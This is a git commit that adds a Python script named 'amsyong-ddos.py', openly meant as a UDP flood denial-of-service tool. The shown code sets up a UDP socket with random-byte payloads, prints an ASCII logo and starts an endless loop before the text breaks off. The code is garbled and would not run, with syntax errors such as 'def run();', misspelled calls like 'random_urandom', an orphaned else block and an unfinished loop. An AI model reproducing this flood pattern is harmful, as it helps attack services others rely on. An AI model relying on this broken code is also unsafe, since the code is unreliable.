0b19917be8305fccba15b0c533958a4d680da03d
KF9474 <kelanasenja24@gmail.com>
2024-12-23 10:16:38 +0700

    Create amsyong-ddos.py

---
+++ amsyong-ddos.py
@@ -0,0 +1,51 @@
+#!/usr/bin/python
+#_*_ coding: utf-8 _*_
+import os
+import sys
+import time
+import string
+import threading
+import socket
+import random
+import fade
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##################
+sock = socket.socket(socket.AF-INET,
+socket.SOCK_DGRAM)
+bytes = random_urandom(1490)
+###############
+
+os.system("clear")
+logo = """
+       ÷÷÷          ÷÷÷         ÷÷
+      ÷÷÷ ÷÷        ÷÷÷ ÷÷   ÷÷ ÷÷
+     ÷÷÷   ÷÷       ÷÷÷  ÷÷ ÷÷  ÷÷
+    ÷÷÷     ÷÷      ÷÷÷   ÷÷    ÷÷
+   ÷÷÷       ÷÷     ÷÷÷         ÷÷
+  ÷÷÷         ÷÷    ÷÷÷         ÷÷
+ ÷÷÷  ÷÷ ÷÷ ÷÷ ÷÷   ÷÷÷         ÷÷
+÷÷÷             ÷÷  ÷÷÷         ÷÷
+
+"""
+
+else:
+    print("incorect credentials. Check in you have
+    Chaps.loco on and try again.")
+    attemps =+ 1
+    continue
+
+def run();
+data = random_urandom(1024)
+i = random.chice(([+]))
+while True:
+    try:
+
+
